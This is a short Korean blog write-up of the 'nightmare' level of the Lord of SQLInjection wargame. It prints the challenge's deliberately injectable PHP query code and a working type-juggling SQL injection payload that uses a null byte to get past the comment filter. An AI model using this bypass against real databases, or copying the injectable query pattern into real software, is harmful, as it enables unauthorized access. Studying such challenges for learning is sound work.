---
title : "LOS Lv.18 nightmare (답지 봄)"
excerpt : "type juggling"
toc: true
toc_sticky: true
categories :
  - rubiya
tags :
  - type juggling
---


## nightmare
```php
query : select id from prob_nightmare where pw=('') and id!='admin'

<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```

## Solution
```
주석 처리는 ;%00으로 대체.

자동형변환(type juggling)을 이용할 것임.
pw=('')=0이 되면 mysql의 '='은 비교연산자이기 때문에 
pw=('') 부분에서 false이므로 0이 리턴이 되기 때문에
0=0이 되므로 true가 됨. 

?pw=')=0;%00
```
